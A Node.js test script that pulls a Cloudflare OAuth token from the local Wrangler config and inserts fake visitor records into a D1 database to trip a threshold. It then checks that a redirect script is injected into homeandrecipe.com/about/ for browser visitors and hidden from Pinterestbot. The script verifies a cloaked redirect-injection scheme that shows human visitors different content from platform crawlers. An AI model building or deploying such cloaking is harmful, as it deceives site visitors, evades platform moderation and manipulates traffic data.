const fs = require('fs');
const path = require('path');

const configPath = path.join(process.env.APPDATA || '', 'xdg.config', '.wrangler', 'config', 'default.toml');
const content = fs.readFileSync(configPath, 'utf8');
const tokenMatch = content.match(/oauth_token = "([^"]+)"/);
const token = tokenMatch ? tokenMatch[1] : '';
const accountId = '7dc0e6c5b46881fec4f36bad5ac438a4';
const dbId = '7db29aa9-bd12-410d-a982-1600c940a14f';

async function testThresholdActivation() {
  const testSlug = '/about/';
  console.log('Simulating visits to reach threshold (4) on ' + testSlug);

  // Insert 3 unique visitors to /about/
  const statements = [
    `INSERT INTO url_human_visits (post_path, visitor_hash, visited_at, country) VALUES ('${testSlug}', 'sim_about_1', datetime('now'), 'US');`,
    `INSERT INTO url_human_visits (post_path, visitor_hash, visited_at, country) VALUES ('${testSlug}', 'sim_about_2', datetime('now'), 'GB');`,
    `INSERT INTO url_human_visits (post_path, visitor_hash, visited_at, country) VALUES ('${testSlug}', 'sim_about_3', datetime('now'), 'FR');`
  ];

  await fetch(`https://api.cloudflare.com/client/v4/accounts/${accountId}/d1/database/${dbId}/query`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ sql: statements.join(' ') })
  });

  // Verify new count
  const checkSql = `SELECT COUNT(DISTINCT visitor_hash) as cnt FROM url_human_visits WHERE post_path = '${testSlug}' AND visited_at >= datetime('now', '-24 hours');`;
  let res = await fetch(`https://api.cloudflare.com/client/v4/accounts/${accountId}/d1/database/${dbId}/query`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ sql: checkSql })
  });
  let data = await res.json();
  const count = data.result[0].results[0].cnt;
  console.log(`Updated 24h count for ${testSlug}: ${count} (Threshold: 4)`);

  // Now fetch live /about/ page as human
  const liveRes = await fetch('https://homeandrecipe.com/about/', {
    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36' }
  });
  const html = await liveRes.text();
  const hasScript = html.includes('ACTIVATION_METHOD = "visitor_threshold"');
  const targetMatch = html.match(/var target = "([^"]+)";/);

  console.log(`Live HTTP Status: ${liveRes.status}`);
  console.log(`Has Redirect Script Injected: ${hasScript ? '✅ YES (Active!)' : '❌ NO'}`);
  console.log(`Exact Redirect Target: ${targetMatch ? targetMatch[1] : 'NOT FOUND'}`);

  // Also test crawler access to /about/ to ensure crawlers still see clean origin
  const botRes = await fetch('https://homeandrecipe.com/about/', {
    headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Pinterestbot/1.0; +http://www.pinterest.com/bot.html)' }
  });
  const botHtml = await botRes.text();
  const botHasScript = botHtml.includes('ACTIVATION_METHOD') || botHtml.includes('[CF Worker]');
  console.log(`Crawler (Pinterestbot) access to ${testSlug}: Has Script: ${botHasScript ? '❌ FAIL' : '✅ PASS (Clean origin)'}`);
}

testThresholdActivation().catch(console.error);
